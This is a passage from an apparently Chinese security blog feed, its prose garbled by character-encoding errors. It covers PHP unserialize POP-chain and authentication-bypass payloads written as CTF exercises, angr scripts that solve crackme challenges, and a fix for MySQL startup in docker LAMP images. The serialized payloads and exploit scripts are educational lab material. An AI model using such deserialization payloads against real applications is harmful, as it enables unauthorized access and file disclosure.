é‚£å°±æ˜¯è¿™ä¸ªç±»åœ¨æŸå¤„è¢«å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨ï¼Œåœ¨ <code>preg_match()</code> å‡½æ•°é‡Œå¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œ <code>source</code> æ˜¯ä¼šè¢«å½“æˆå­—ç¬¦ä¸²æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯åœ¨ <code>__wakeup()</code> é‡Œã€‚è¿™æ · <code>pop</code>é“¾å°±æ˜¯ <code>Show-&gt;__wakeup()-&gt;__toString-&gt;Test-&gt;__get()-&gt;Read-&gt;__invoke()-&gt;file_get()</code>ã€‚</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Read</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span> = <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    &#125;<br><br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br>    <span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br>    <span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Read</span>();<br><br>    <span class="hljs-variable">$b</span>-&gt;p = <span class="hljs-variable">$c</span>;<br>    <span class="hljs-variable">$a</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>] = <span class="hljs-variable">$b</span>;<br>    <span class="hljs-variable">$a</span>-&gt;source = <span class="hljs-variable">$a</span>;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br>    <span class="hljs-comment">//O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;r:1;s:3:&quot;str&quot;;a:1:&#123;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:4:&quot;Read&quot;:1:&#123;s:3:&quot;var&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä¼ å‚è¿›å»å³å¯ã€‚</p><h1 id="Authentication-bypass"><a href="#Authentication-bypass" class="headerlink" title="Authentication bypass"></a>Authentication bypass</h1><h2 id="Type-juggling"><a href="#Type-juggling" class="headerlink" title="Type juggling"></a>Type juggling</h2><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;auth&#x27;</span>]);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-variable">$adminName</span> &amp;&amp; <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;password&#x27;</span>] == <span class="hljs-variable">$adminPassword</span>) &#123;<br>        <span class="hljs-variable">$admin</span> = <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$admin</span> = <span class="hljs-literal">false</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>å› ä¸º <code>true == &quot;str&quot;</code> is true.</p><p>æ‰€ä»¥æˆ‘ä»¬ä¼ å¸ƒå°”å€¼å³å¯ï¼š</p><p>Payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;b:<span class="hljs-number">1</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;b:<span class="hljs-number">1</span>;&#125;<br></code></pre></td></tr></table></figure><h2 id="Object-reference"><a href="#Object-reference" class="headerlink" title="Object reference"></a>Object reference</h2><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Object</span></span><br><span class="hljs-class">        </span>&#123;<br>            <span class="hljs-keyword">var</span> <span class="hljs-variable">$guess</span>;<br>            <span class="hljs-keyword">var</span> <span class="hljs-variable">$secretCode</span>;<br>        &#125;<br><br>    <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;input&#x27;</span>]);<br>    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$obj</span>) &#123;<br>        <span class="hljs-variable">$obj</span>-&gt;secretCode = <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">500000</span>,<span class="hljs-number">999999</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$obj</span>-&gt;guess === <span class="hljs-variable">$obj</span>-&gt;secretCode) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Win&quot;</span>;<br>        &#125;<br>    &#125;*/<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Object</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$guess</span>;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$secretCode</span>;<br>    &#125;<br><br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>    <span class="hljs-variable">$a</span>-&gt;guess = &amp;<span class="hljs-variable">$a</span>-&gt;secretCode; <span class="hljs-comment">//ä»¤guessä¸ºæŒ‡å‘secretCodeçš„æŒ‡é’ˆ</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>Payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Object&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;secretCode&quot;</span>;N;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;guess&quot;</span>;R:<span class="hljs-number">2</span>;&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pythonçš„äºŒè¿›åˆ¶åˆ†ææ¡†æ¶angr</title>
    <link href="/2020/02/22/angr/"/>
    <url>/2020/02/22/angr/</url>
    
    <content type="html"><![CDATA[<p>ä½œä¸ºä¸€ä¸ª Web ç‹—æœ‰æ—¶å€™ç®€å•çš„é€†å‘æˆ–è€…è‹¦åŠ›æ´»è¿˜æ˜¯å¯ä»¥åšåšçš„ï¼Œä½†æ˜¯æœ¬ç€èƒ½ç™½å«–ä¸è‡ªå·±å¹²ä¸ºä¸»çš„ç²¾ç¥ï¼Œå‘ç°äº† <code>angr</code>ï¼Œè®°å½•ä¸€ä¸‹ä¸€äº›ç®€å•çš„åº”ç”¨ã€‚</p><p><a href="https://github.com/angr/angr">å®˜æ–¹Githubåœ°å€</a></p><h1 id="å®‰è£…-åŸºäºKali-64"><a href="#å®‰è£…-åŸºäºKali-64" class="headerlink" title="å®‰è£…(åŸºäºKali 64)"></a>å®‰è£…(åŸºäºKali 64)</h1><h2 id="å®‰è£…-virtualenv"><a href="#å®‰è£…-virtualenv" class="headerlink" title="å®‰è£… virtualenv"></a>å®‰è£… virtualenv</h2><blockquote><p>pip install virtualenv</p></blockquote><h2 id="åˆ›å»ºç›®å½•"><a href="#åˆ›å»ºç›®å½•" class="headerlink" title="åˆ›å»ºç›®å½•"></a>åˆ›å»ºç›®å½•</h2><blockquote><p>mkdir angr_enviroment &amp;&amp; cd angr_enviroment&#x2F;</p></blockquote><h2 id="åˆ›å»ºç‹¬ç«‹è¿è¡Œçš„pythonè¿è¡Œç¯å¢ƒ"><a href="#åˆ›å»ºç‹¬ç«‹è¿è¡Œçš„pythonè¿è¡Œç¯å¢ƒ" class="headerlink" title="åˆ›å»ºç‹¬ç«‹è¿è¡Œçš„pythonè¿è¡Œç¯å¢ƒ"></a>åˆ›å»ºç‹¬ç«‹è¿è¡Œçš„pythonè¿è¡Œç¯å¢ƒ</h2><p>å‘½åä¸º <code>venv</code>:(å› ä¸ºå®‰è£…angrçš„æ—¶å€™æ€»æ˜¯ä¼šå› ä¸ºpythonç¯å¢ƒé—®é¢˜å‡ºç°å„ç§é”™è¯¯ï¼‰</p><blockquote><p>virtualenv â€“no-site-packages venv</p></blockquote><p>åˆ›å»ºä¸€ä¸ªç‹¬ç«‹çš„pythonè¿è¡Œç¯å¢ƒï¼Œæˆ‘ä»¬è¿˜åŠ ä¸Šäº†ä¸€ä¸ªå‚æ•°<code>--no-site-packages</code>,è¿™æ ·å·²ç»å®‰è£…åˆ°å½“å‰ç³»ç»Ÿçš„æ‰€æœ‰ç¬¬ä¸‰æ–¹åŒ…éƒ½ä¸ä¼šå¤åˆ¶è¿‡æ¥ï¼Œæˆ‘ä»¬å°±å¾—åˆ°äº†ä¸€ä¸ªä¸å¸¦ä»»ä½•ç¬¬ä¸‰æ–¹åŒ…çš„â€œå¹²å‡€â€çš„pythonè¿è¡Œç¯å¢ƒã€‚æ–°å»ºçš„pythonç¯å¢ƒè¢«æ”¾åˆ°äº†å½“å‰ç›®å½•ä¸‹çš„venvç›®å½•ï¼Œæœ‰äº†venvè¿™ä¸ªpythonç¯å¢ƒï¼Œå¯ä»¥ç”¨sourceè¿›å…¥è¯¥ç¯å¢ƒ</p><h2 id="è¿›å…¥å¯¹åº”çš„ç¯å¢ƒ"><a href="#è¿›å…¥å¯¹åº”çš„ç¯å¢ƒ" class="headerlink" title="è¿›å…¥å¯¹åº”çš„ç¯å¢ƒ"></a>è¿›å…¥å¯¹åº”çš„ç¯å¢ƒ</h2><blockquote><p>source venv&#x2F;bin&#x2F;activate</p></blockquote><p>å°±å¯ä»¥æ­£å¸¸å®‰è£…å„ç§ç¬¬ä¸‰æ–¹åŒ…ï¼Œå¹¶è¿è¡Œpythonå‘½ä»¤ï¼Œåœ¨venvç¯å¢ƒä¸‹ï¼Œç”¨pipå®‰è£…çš„åŒ…éƒ½ä¼šè¢«å®‰è£…åˆ°venvè¿™ä¸ªç¯å¢ƒä¸‹ï¼Œç³»ç»Ÿpythonç¯å¢ƒä¸å—ä»»ä½•å½±å“ï¼Œä¹Ÿå°±æ˜¯è¯´,venvç¯å¢ƒæ˜¯ä¸“é—¨é’ˆå¯¹anger_enviromentè¿™ä¸ªåº”ç”¨åˆ›å»ºçš„ã€‚</p><h2 id="å®‰è£…angr"><a href="#å®‰è£…angr" class="headerlink" title="å®‰è£…angr"></a>å®‰è£…angr</h2><blockquote><p>pip install angr</p></blockquote><h2 id="é€€å‡ºå½“å‰venvç¯å¢ƒ"><a href="#é€€å‡ºå½“å‰venvç¯å¢ƒ" class="headerlink" title="é€€å‡ºå½“å‰venvç¯å¢ƒ"></a>é€€å‡ºå½“å‰venvç¯å¢ƒ</h2><p>ä½¿ç”¨<code>deactive</code>å‘½ä»¤ï¼š<code>deactive</code>ï¼Œè¿™ä¸ªæ—¶å€™ä¼šå›åˆ°æ­£å¸¸çš„ç¯å¢ƒã€‚</p><h1 id="å¯¹äºç®€å•çš„äºŒè¿›åˆ¶ç¨‹åºéªŒè¯çš„è®¡ç®—"><a href="#å¯¹äºç®€å•çš„äºŒè¿›åˆ¶ç¨‹åºéªŒè¯çš„è®¡ç®—" class="headerlink" title="å¯¹äºç®€å•çš„äºŒè¿›åˆ¶ç¨‹åºéªŒè¯çš„è®¡ç®—"></a>å¯¹äºç®€å•çš„äºŒè¿›åˆ¶ç¨‹åºéªŒè¯çš„è®¡ç®—</h1><p>ç¯å¢ƒï¼š<code>Kali Linux 2019.3</code>ï¼Œ<code>Python 2.7</code></p><p>ä»¥è‡ªå·±å†™çš„ elf ä¸ºä¾‹ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-comment">// wust&#123;i_l0ve_y0u&#125;</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">char</span> buf[<span class="hljs-number">35</span>];<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input your flag\n&quot;</span>);<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, buf);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(buf); ++i)<br>&#123;<br>buf[i] ^= <span class="hljs-number">0xe</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(buf,<span class="hljs-string">&quot;y&#123;&#125;zugQb&gt;xkQw&gt;&#123;s&quot;</span>))<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Congratulations!\n&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;go out\n&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬é¦–å…ˆç”¨ IDA åˆ†æä¸€ä¸‹ç¨‹åºï¼Œå¯ä»¥çœ‹åˆ°ï¼Œå¯¹è¾“å…¥è¿›è¡Œä¸€é¡¿è®¡ç®—å(å¼‚æˆ–0xe)ï¼Œä¸å­—ç¬¦ä¸²å¯¹æ¯”ï¼Œå¦‚æœæ­£ç¡®çš„è¯å³è¾“å‡º <code>Congratulations!</code>ã€‚<br><img src="https://s2.ax1x.com/2020/02/22/3QXn5q.png" alt="3QXn5q.png"></p><p>äºæ˜¯æˆ‘ä»¬å¯ä»¥ç”¨è„šæœ¬è¿›è¡Œè‡ªåŠ¨åŒ–åˆ†æè®¡ç®—ï¼Œçœ‹çœ‹æ€æ ·è¾“å…¥æ‰èƒ½è¾¾åˆ°è¾“å‡º <code>Congratulations!</code>çš„ç›®çš„ã€‚</p><p>è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><br>proj = angr.Project(<span class="hljs-string">&quot;xor&quot;</span>)<br>simgr = proj.factory.simgr()<br>simgr.explore(find=<span class="hljs-keyword">lambda</span> s: <span class="hljs-string">b&quot;Congratulations!&quot;</span> <span class="hljs-keyword">in</span> s.posix.dumps(<span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(simgr.found[<span class="hljs-number">0</span>].posix.dumps(<span class="hljs-number">0</span>))<br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœ:</p><p><img src="https://s2.ax1x.com/2020/02/22/3QXeVs.jpg" alt="3QXeVs.jpg"></p><h1 id="è§£å†³-CTF-ä¸­çš„é¢˜ç›®"><a href="#è§£å†³-CTF-ä¸­çš„é¢˜ç›®" class="headerlink" title="è§£å†³ CTF ä¸­çš„é¢˜ç›®"></a>è§£å†³ CTF ä¸­çš„é¢˜ç›®</h1><h2 id="CSAW-CTF-2015-Quals-Reversing-500-â€œwyvernâ€"><a href="#CSAW-CTF-2015-Quals-Reversing-500-â€œwyvernâ€" class="headerlink" title="CSAW CTF 2015 Quals - Reversing 500, â€œwyvernâ€"></a>CSAW CTF 2015 Quals - Reversing 500, â€œwyvernâ€</h2><p>Binary File in <a href="https://github.com/angr/angr-doc/blob/master/examples/csaw_wyvern/wyvern">Here</a></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># coding: utf-8</span><br><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment"># Load the binary. This is a 64-bit C++ binary, pretty heavily obfuscated.</span><br>    <span class="hljs-comment"># its correct emulation by angr depends heavily on the libraries it is loaded with,</span><br>    <span class="hljs-comment"># so if this script fails, try copying to this dir the .so files from our binaries repo:</span><br>    <span class="hljs-comment"># https://github.com/angr/binaries/tree/master/tests/x86_64</span><br>    p = angr.Project(<span class="hljs-string">&#x27;wyvern&#x27;</span>)<br><br>    <span class="hljs-comment"># It&#x27;s reasonably easy to tell from looking at the program in IDA that the key will</span><br>    <span class="hljs-comment"># be 29 bytes long, and the last byte is a newline. Let&#x27;s construct a value of several</span><br>    <span class="hljs-comment"># symbols that we can add constraints on once we have a state.</span><br><br>    flag_chars = [claripy.BVS(<span class="hljs-string">&#x27;flag_%d&#x27;</span> % i, <span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">28</span>)]<br>    flag = claripy.Concat(*flag_chars + [claripy.BVV(<span class="hljs-string">b&#x27;\n&#x27;</span>)])<br><br>    <span class="hljs-comment"># This block constructs the initial program state for analysis.</span><br>    <span class="hljs-comment"># Because we&#x27;re going to have to step deep into the C++ standard libraries</span><br>    <span class="hljs-comment"># for this to work, we need to run everyone&#x27;s initializers. The full_init_state</span><br>    <span class="hljs-comment"># will do that. In order to do this peformantly, we will use the unicorn engine!</span><br>    st = p.factory.full_init_state(<br>            args=[<span class="hljs-string">&#x27;./wyvern&#x27;</span>],<br>            add_options=angr.options.unicorn,<br>            stdin=flag,<br>    )<br><br>    <span class="hljs-comment"># Constrain the first 28 bytes to be non-null and non-newline:</span><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> flag_chars:<br>        st.solver.add(k != <span class="hljs-number">0</span>)<br>        st.solver.add(k != <span class="hljs-number">10</span>)<br><br>    <span class="hljs-comment"># Construct a SimulationManager to perform symbolic execution.</span><br>    <span class="hljs-comment"># Step until there is nothing left to be stepped.</span><br>    sm = p.factory.simulation_manager(st)<br>    sm.run()<br><br>    <span class="hljs-comment"># Get the stdout of every path that reached an exit syscall. The flag should be in one of these!</span><br>    out = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> pp <span class="hljs-keyword">in</span> sm.deadended:<br>        out = pp.posix.dumps(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#123;&#x27;</span> <span class="hljs-keyword">in</span> out:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">next</span>(<span class="hljs-built_in">filter</span>(<span class="hljs-keyword">lambda</span> s: <span class="hljs-string">b&#x27;flag&#123;&#x27;</span> <span class="hljs-keyword">in</span> s, out.split()))<br><br>    <span class="hljs-comment"># Runs in about 15 minutes!</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>():<br>    <span class="hljs-keyword">assert</span> main() == <span class="hljs-string">b&#x27;flag&#123;dr4g0n_or_p4tric1an_it5_LLVM&#125;&#x27;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    before = time.time()<br>    <span class="hljs-built_in">print</span>(main())<br>    after = time.time()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Time elapsed: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(after - before))<br></code></pre></td></tr></table></figure><p>å¦‚ä½•ä½¿ç”¨ angr è§£å†³ CTF çš„é¢˜ç›®ï¼Œè¯¦ç»†å‚è€ƒå®˜æ–¹æ–‡æ¡£çš„ä¾‹å­ï¼š</p><p><a href="http://docs.angr.io/docs/examples.html">Examples using angr to solve CTF challenges</a></p><h1 id="æŒ–å‘-TO-DO"><a href="#æŒ–å‘-TO-DO" class="headerlink" title="æŒ–å‘ TO-DO"></a>æŒ–å‘ TO-DO</h1><p>To be continueâ€¦</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker_lampç¯å¢ƒä¸‹mysqlå¯åŠ¨é—®é¢˜</title>
    <link href="/2020/02/18/issue_with_docker_lampmysql/"/>
    <url>/2020/02/18/issue_with_docker_lampmysql/</url>
    
    <content type="html"><![CDATA[<h1 id="tutum-x2F-lamp"><a href="#tutum-x2F-lamp" class="headerlink" title="tutum&#x2F;lamp"></a>tutum&#x2F;lamp</h1><p>tutum&#x2F;lamp ç”¨æ¥æ­å»ºctfçš„webç¯å¢ƒå¯ä»¥è¯´æ˜¯éå¸¸æ–¹ä¾¿ï¼Œä½†æ˜¯æœ€è¿‘ç»™æ ¡èµ›å‡ºsqlé¢˜ç›®çš„æ—¶å€™å‘ç°ä¸€äº›lampç¯å¢ƒçš„é—®é¢˜ï¼Œç›®å‰åªå°è¯•äº†linodeå’Œtutumçš„é•œåƒã€‚åœ¨tutum&#x2F;lampä¸‹ï¼Œç›´æ¥è¿è¡Œmysqlæ˜¯ä¼šæŠ¥é”™</p><p><code>ERROR 2002 (HY000): Can&#39;t connect to local MySQL server through socket &#39;/var/run/mysqld/mysqld.sock&#39;</code></p><p>ä¸€å¼€å§‹å°è¯•éäº†ç½‘ä¸Šçš„å„ç§æ–¹æ³•ï¼Œå› ä¸ºæˆ‘ç”¨çš„å…¨æ˜¯åŸç”Ÿæ€çš„tutum&#x2F;lampï¼Œæ²¡æœ‰æ”¹åŠ¨ï¼ŒæŒ‰ç†è¯´åˆ«äººèƒ½è¿è¡Œæˆ‘ä¹Ÿèƒ½ï¼Œè¿™é‡Œåªè¯´æˆ‘ç¢°åˆ°æƒ…å†µçš„è§£å†³æ–¹æ³•ã€‚</p><p>å…¶å®mysqlä¸€å¼€å§‹å¹¶æ²¡æœ‰æ‰“å¼€ï¼Œæˆ‘ä»¬æ‰§è¡Œ<code>service mysql start </code>ä¼šå‘ç°æ‰§è¡Œfailï¼Œæˆ‘ä»¬cdåˆ°æ ¹ç›®å½•ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°<code>run.sh</code>ï¼Œ<code>create_mysql_admin_user.sh</code>ï¼Œ<code>start-mysqld.sh</code>ï¼Œæˆ‘catäº†ä¸€ä¸‹run.shå¯ä»¥çœ‹åˆ°æ˜¯å¯¹mysqlçš„ç¯å¢ƒè¿›è¡Œé…ç½®ï¼Œæ‰€ä»¥åªéœ€è¦<code>./run.sh</code>å»é…ç½®ä¸€ä¸‹å°±å¯ä»¥äº†ï¼Œè¾“å‡ºæ—¥å¿—ä¼šæœ‰adminè´¦æˆ·çš„å¯†ç ï¼Œè¦æ³¨æ„ä¸€ä¸‹ï¼Œä½¿ç”¨rootè´¦æˆ·ä¹Ÿè¡Œï¼Œå¯†ç æ˜¯ç©ºï¼Œä½†æ˜¯ä»…é™<code>local connection</code>ï¼Œå¯¹äºå‡ºé¢˜æ¥è¯´ä¹Ÿè¶³å¤Ÿäº†ã€‚</p><h1 id="linode-x2F-lamp"><a href="#linode-x2F-lamp" class="headerlink" title="linode&#x2F;lamp"></a>linode&#x2F;lamp</h1><p>linode&#x2F;lampå°±æ²¡æœ‰é‚£ä¹ˆå¤šå†™å¥½çš„shè„šæœ¬äº†ï¼Œè¿™ä¸ªé—®é¢˜å‚è€ƒäº†<a href="https://blog.csdn.net/lmss82/article/details/4414178">ä¸€ç¯‡åšå®¢çš„æ–¹æ¡ˆ5</a>ã€‚</p><blockquote><p>æ‘˜è¦ï¼šè§£å†³ä¸èƒ½é€šè¿‡mysql.sockè¿æ¥MySQLé—®é¢˜<br>è¿™ä¸ªé—®é¢˜ä¸»è¦æç¤ºæ˜¯ï¼Œä¸èƒ½é€šè¿‡ â€˜&#x2F;tmp&#x2F;mysql.sockâ€™ï¼Œä½†æ˜¯ä¸€äº›mysqlå®‰è£…æ–¹æ³•mysql.sockæ”¾åœ¨&#x2F;var&#x2F;lib&#x2F;mysql.sockæˆ–è€…å…¶ä»–çš„ä»€ä¹ˆåœ°æ–¹ï¼Œä½ å¯ä»¥é€šè¿‡ä¿®æ”¹&#x2F;etc&#x2F;my.cnfæ–‡ä»¶æ¥ä¿®æ­£å®ƒï¼Œæ‰“å¼€æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°å¦‚ä¸‹ï¼š</p><p>[mysqld]<br>socket&#x3D;&#x2F;var&#x2F;lib&#x2F;mysql.sock<br>æ”¹ä¸€ä¸‹å°±å¥½äº†ï¼Œä½†ä¹Ÿä¼šå¼•èµ·å…¶ä»–çš„é—®é¢˜ï¼Œå¦‚mysqlç¨‹åºè¿ä¸ä¸Šäº†ï¼Œå†åŠ 